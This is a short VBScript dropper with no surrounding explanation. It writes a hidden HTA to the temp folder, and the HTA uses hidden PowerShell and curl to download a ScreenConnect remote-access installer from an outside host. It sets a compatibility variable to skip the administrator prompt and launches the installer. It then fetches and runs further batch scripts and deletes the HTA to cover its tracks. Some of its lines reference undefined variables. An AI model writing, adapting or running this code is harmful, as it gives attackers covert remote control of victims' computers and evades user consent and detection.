Set sh = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
' --- STAGE 1: Define Paths ---
tempHta = sh.ExpandEnvironmentStrings("%TEMP%\UpdateTask.hta")
targetExe = sh.ExpandEnvironmentStrings("%TEMP%\Setup_Update.msi")
url = "https://q3x.xyz/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest&c=mad&c=&c=&c=&c=&c=&c=&c="
' --- STAGE 2: Build the HTA Content ---
' We integrate 'set __COMPAT_LAYER=RunAsInvoker' into the execution string.
' This tells Windows to ignore the 'requireAdministrator' flag in the EXE manifest.
Set f = fso.CreateTextFile(tempHta, True )
f.WriteLine "<html><script language='VBScript'>"
f.WriteLine "  Set ws = CreateObject(""WScript.Shell"")"
f.WriteLine "  ' The command downloads the file, sets the compatibility env var, and then starts the process."
f.WriteLine "  cmd = ""powershell.exe -WindowStyle Hidden -Command """ & _
" & ""$u='" & url & "';$p='" & targetExe & "';curl.exe -L -s -o $p $u;" & _
" $env:__COMPAT_LAYER='RunAsInvoker'; Start-Process $p"""
f.WriteLine "  ws.Run cmd, 0, False"
f.WriteLine "  window.close()"
f.WriteLine "</script></html>"
f.WriteLine "  s.Run ""powershell -W Hidden -C iwr '(TEXT SCRIPT URL 1)' -OutFile '"" & t & ""cleaner.bat'; Start-Process '"" & t & ""cleaner.bat'"", 0, True"
f.WriteLine "  s.Run ""powershell -W Hidden -C iwr '(TEXT SCRIPT URL 2)' -OutFile '"" & t & ""renamer.bat'; Start-Process '"" & t & ""renamer.bat'"", 0, True"
f.Close
' --- STAGE 3: Execute and Cleanup ---
sh.Run "mshta.exe " & tempHta, 0, True
WScript.Sleep 2000
If fso.FileExists(tempHta) Then fso.DeleteFile(tempHta)